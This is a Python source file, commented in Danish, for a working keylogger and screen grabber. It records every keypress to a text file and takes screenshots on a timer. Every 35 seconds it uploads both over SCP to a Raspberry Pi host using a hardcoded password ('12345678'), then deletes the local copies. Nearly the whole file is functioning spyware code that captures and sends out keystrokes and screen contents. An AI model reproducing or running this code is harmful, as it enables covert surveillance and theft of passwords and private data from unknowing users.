import os
import keyboard
from time import sleep
import platform
import PIL
from PIL import ImageGrab, Image
import schedule
import time
import threading
from datetime import datetime
from paramiko import SSHClient
from scp import SCPClient
import shutil


#Der skal tages screenshots hver 5. min, gemmes i en mappe og navngives efter timestamp
#Log + screenshots skal sendes hver time
#2 threads - 1 til screenshots hvert 5 min, 1 til keylogger + screenshot hver time via SCP

#TODO - Få screenshots til at sende med SCP. Få timestamps til at slette gamle screenshots.


###Keylogger####
def wipe_log():
    with open('tastelog.txt', 'w') as file:     
        file.write("")

def keylog(strokes):
    with open('tastelog.txt', 'a') as file:     
        file.write(str(strokes.name))




###Screenshot/Timestamp####
timestamp = None

def screenshot(): #.png skal gemmes some timestamp
    os.makedirs("screenshotdir", exist_ok=True)
    global timestamp
    img = PIL.ImageGrab.grab()
    current_time = datetime.now()
    timestamp = current_time.strftime("%m-%d-%Y %H.%M.%S")
    img.save(f"screenshotdir/{timestamp}.png")
    print("\nScreenshot taget")
    return timestamp



###SCP/Fjern SC/KL fra logging device###
def scp_transfer():
        global timestamp
        shot = timestamp
        
        ssh = SSHClient()
        ssh.load_system_host_keys()
        ssh.connect("raspberrypi.local", port=22, username="pi", password="12345678")
        scp = SCPClient(ssh.get_transport(), socket_timeout=20.0)
        
        scp.put('tastelog.txt', recursive=False, remote_path=f'/home/pi/Desktop/keyloggerdir/tastelog{timestamp}.txt')
        scp.put("screenshotdir", recursive=True, remote_path='/home/pi/Desktop/keyloggerdir/')
        print("\nFiler sendt")

        scp.close()

        shutil.rmtree("screenshotdir")
        os.remove("tastelog.txt")
        print("\nFjernet screenshotmappe og tastelog.txt")
        wipe_log()
        print("\nNy tastelog genereret!")
        




###Schedule####
def run_continuously(interval=1):
    cease_continuous_run = threading.Event()

    class ScheduleThread(threading.Thread):
        @classmethod
        def run(cls):
            while not cease_continuous_run.is_set():
                schedule.run_pending()
                time.sleep(interval)

    continuous_thread = ScheduleThread()
    continuous_thread.start()
    return cease_continuous_run


schedule.every(10).seconds.do(screenshot)
schedule.every(35).seconds.do(scp_transfer)
#schedule.every(5).minutes.do(screenshot)
#schedule.every(1).hours.do(scp_transfer)



# Stop the background thread
#stop_run_continuously.set()





###Main####
run_continuously()
print("OS Name:", platform.system())
wipe_log()
keyboard.on_press(keylog)
keyboard.wait('esc')


    



